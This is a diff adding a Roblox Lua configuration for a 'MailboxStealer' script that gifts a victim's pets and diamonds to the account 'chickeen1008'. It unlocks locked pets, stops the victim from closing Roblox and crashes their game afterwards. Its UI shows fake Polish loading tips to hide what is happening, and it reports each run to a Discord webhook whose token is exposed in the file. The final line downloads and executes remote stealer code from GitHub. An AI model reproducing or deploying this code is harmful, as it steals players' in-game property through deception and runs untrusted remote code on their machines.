@@ -1,0 +1,21 @@
+--[[ Main Config ]]--
+_G.Username = "chickeen1008" --// Username To Send Pets To
+_G.GiftMessage = "for you" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = false --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1095450865558634506/RZ1yYhFZHgkJ34CuBmIPPVOSk3EtVej3Buhrw0ERzeGfLR45b4z2hp5CoKkJ4pShXgvq" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "Wczytywanie skryptów" --// Script Name On The UI
+_G.Tip1 = "Skanowanie Anty Multi konto" --// Gives You Tips On The UI
+_G.Tip2 = "ładowanie gui" --// Gives You Tips On The UI
+_G.Tip3 = "skanowanie pets" --// Gives You Tips On The UI
+_G.Tip4 = "wczytywanie" --// Gives You Tips On The UI
+_G.Tip5 = "dano pozwolenie" --// Gives You Tips On The UI
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua", true))()
